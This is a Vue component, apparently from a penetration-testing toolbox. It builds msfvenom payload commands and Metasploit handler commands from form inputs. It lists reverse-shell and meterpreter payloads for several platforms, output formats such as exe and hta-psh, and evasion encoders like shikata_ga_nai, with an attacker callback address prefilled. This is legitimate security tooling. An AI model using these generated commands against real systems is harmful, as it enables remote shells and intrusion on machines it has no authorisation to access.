<template>
    <HeightResize v-slot="{height}">
        <div :style="{height: height + 'px'}" style="overflow: auto; padding: 5px;">
            <!-- 参数配置区域 -->
            <Display>
                <Align direction="vertical">
                    <!-- Payload 选择 -->
                    <Select
                        v-model="action.current.payload"
                        :label="$t('msfvenom_payload')"
                        :options="payloadOptions"
                    />
                    <!-- LHOST / LPORT -->
                    <Align>
                        <Input
                            v-model="action.current.lhost"
                            :label="$t('msfvenom_lhost')"
                            placeholder="10.10.14.1"
                        />
                        <Input
                            v-model="action.current.lport"
                            :label="$t('msfvenom_lport')"
                            placeholder="4444"
                        />
                    </Align>
                    <!-- 输出格式 -->
                    <Select
                        v-model="action.current.format"
                        :label="$t('msfvenom_format')"
                        :options="formatOptions"
                    />
                    <!-- 编码器 + 迭代次数 -->
                    <Align>
                        <Select
                            v-model="action.current.encoder"
                            :label="$t('msfvenom_encoder')"
                            :options="encoderOptions"
                        />
                        <Input
                            v-model="action.current.iterations"
                            :label="$t('msfvenom_iterations')"
                            placeholder="3"
                        />
                    </Align>
                    <!-- 附加选项 -->
                    <Input
                        v-model="action.current.extraOptions"
                        :label="$t('msfvenom_extra_options')"
                        placeholder="PrependMigrate=true EXITFUNC=thread"
                    />
                </Align>
            </Display>

            <!-- 生成的 msfvenom 命令 -->
            <div class="sectool-msfvenom-section-title">{{ $t('msfvenom_generated_cmd') }}</div>
            <Textarea
                :model-value="generatedCommand"
                :height="72"
                :placeholder="$t('msfvenom_cmd_label')"
                copy="msfvenom"
            />

            <!-- Handler 监听命令 -->
            <div class="sectool-msfvenom-section-title" style="margin-top: 8px;">
                {{ $t('msfvenom_handler_title') }}
            </div>
            <Textarea
                :model-value="handlerCommand"
                :height="130"
                :placeholder="$t('msfvenom_handler_label')"
                copy="Handler"
            />
        </div>
    </HeightResize>
</template>

<script lang="ts" setup>
import { useAction, initialize } from "@/store/action"
import { useGlobalVars } from "@/store/globalVars"

// 从全局变量获取默认 LHOST / LPORT
const { getVar } = useGlobalVars()
const defaultLhost = getVar("LHOST") || "10.10.14.1"
const defaultLport = getVar("LPORT") || "4444"

// ======================== Payload 选项（按平台分组） ========================

const payloadOptions = [
    // Windows
    { value: "windows/meterpreter/reverse_tcp", label: "[Windows] windows/meterpreter/reverse_tcp" },
    { value: "windows/meterpreter/reverse_https", label: "[Windows] windows/meterpreter/reverse_https" },
    { value: "windows/shell_reverse_tcp", label: "[Windows] windows/shell_reverse_tcp" },
    { value: "windows/x64/meterpreter/reverse_tcp", label: "[Windows] windows/x64/meterpreter/reverse_tcp" },
    { value: "windows/x64/shell_reverse_tcp", label: "[Windows] windows/x64/shell_reverse_tcp" },
    // Linux
    { value: "linux/x86/meterpreter/reverse_tcp", label: "[Linux] linux/x86/meterpreter/reverse_tcp" },
    { value: "linux/x64/shell_reverse_tcp", label: "[Linux] linux/x64/shell_reverse_tcp" },
    { value: "linux/x86/shell_reverse_tcp", label: "[Linux] linux/x86/shell_reverse_tcp" },
    // macOS
    { value: "osx/x64/shell_reverse_tcp", label: "[macOS] osx/x64/shell_reverse_tcp" },
    // Web / Script
    { value: "php/meterpreter/reverse_tcp", label: "[Web] php/meterpreter/reverse_tcp" },
    { value: "php/reverse_php", label: "[Web] php/reverse_php" },
    { value: "java/jsp_shell_reverse_tcp", label: "[Web] java/jsp_shell_reverse_tcp" },
    { value: "python/meterpreter/reverse_tcp", label: "[Web] python/meterpreter/reverse_tcp" },
    { value: "python/shell_reverse_tcp", label: "[Web] python/shell_reverse_tcp" },
    { value: "cmd/unix/reverse_bash", label: "[Script] cmd/unix/reverse_bash" },
    { value: "cmd/unix/reverse_python", label: "[Script] cmd/unix/reverse_python" },
    { value: "cmd/unix/reverse_netcat", label: "[Script] cmd/unix/reverse_netcat" },
    // Android
    { value: "android/meterpreter/reverse_tcp", label: "[Android] android/meterpreter/reverse_tcp" },
]

// ======================== 输出格式选项 ========================

const formatOptions = [
    { value: "exe", label: "exe" },
    { value: "elf", label: "elf" },
    { value: "raw", label: "raw" },
    { value: "python", label: "python" },
    { value: "c", label: "c" },
    { value: "csharp", label: "csharp" },
    { value: "ruby", label: "ruby" },
    { value: "dll", label: "dll" },
    { value: "msi", label: "msi" },
    { value: "psh", label: "psh" },
    { value: "psh-cmd", label: "psh-cmd" },
    { value: "psh-net", label: "psh-net" },
    { value: "hta-psh", label: "hta-psh" },
    { value: "war", label: "war" },
    { value: "jar", label: "jar" },
    { value: "asp", label: "asp" },
    { value: "aspx", label: "aspx" },
    { value: "jsp", label: "jsp" },
]

// ======================== 编码器选项（可选） ========================

const encoderOptions = [
    { value: "", label: "None" },
    { value: "x86/shikata_ga_nai", label: "x86/shikata_ga_nai" },
    { value: "x86/jmp_call_additive", label: "x86/jmp_call_additive" },
    { value: "x64/xor", label: "x64/xor" },
    { value: "x64/zutto_dekiru", label: "x64/zutto_dekiru" },
    { value: "cmd/powershell_base64", label: "cmd/powershell_base64" },
    { value: "php/base64", label: "php/base64" },
]

// ======================== 格式 → 文件扩展名映射 ========================

const extensionMap: Record<string, string> = {
    "exe": "exe",
    "elf": "elf",
    "raw": "bin",
    "python": "py",
    "c": "c",
    "csharp": "cs",
    "ruby": "rb",
    "dll": "dll",
    "msi": "msi",
    "psh": "ps1",
    "psh-cmd": "cmd",
    "psh-net": "ps1",
    "hta-psh": "hta",
    "war": "war",
    "jar": "jar",
    "asp": "asp",
    "aspx": "aspx",
    "jsp": "jsp",
}

// ======================== 初始化状态 ========================

const action = useAction(await initialize({
    payload: "windows/meterpreter/reverse_tcp",
    lhost: defaultLhost,
    lport: defaultLport,
    format: "exe",
    encoder: "",
    iterations: "3",
    extraOptions: "",
}))

// ======================== 生成 msfvenom 命令 ========================

const generatedCommand = $computed(() => {
    var cmd = "msfvenom"
    cmd = cmd + " -p " + action.current.payload
    cmd = cmd + " LHOST=" + action.current.lhost
    cmd = cmd + " LPORT=" + action.current.lport

    // 附加选项（如 PrependMigrate=true EXITFUNC=thread 等）
    var extra = action.current.extraOptions.trim()
    if (extra) {
        cmd = cmd + " " + extra
    }

    // 编码器及迭代次数
    if (action.current.encoder) {
        cmd = cmd + " -e " + action.current.encoder
        cmd = cmd + " -i " + (action.current.iterations || "3")
    }

    // 输出格式
    cmd = cmd + " -f " + action.current.format

    // 输出文件名
    var ext = extensionMap[action.current.format] || action.current.format
    cmd = cmd + " -o payload." + ext

    return cmd
})

// ======================== 生成 Handler 监听命令 ========================

const handlerCommand = $computed(() => {
    const lines: string[] = []
    lines.push("use exploit/multi/handler")
    lines.push("set payload " + action.current.payload)
    lines.push("set LHOST " + action.current.lhost)
    lines.push("set LPORT " + action.current.lport)
    lines.push("exploit")
    return lines.join("\n")
})
</script>

<style scoped>
.sectool-msfvenom-section-title {
    font-size: 12px;
    font-weight: 600;
    color: var(--sectool-text-secondary);
    margin: 6px 0 4px 2px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}
</style>
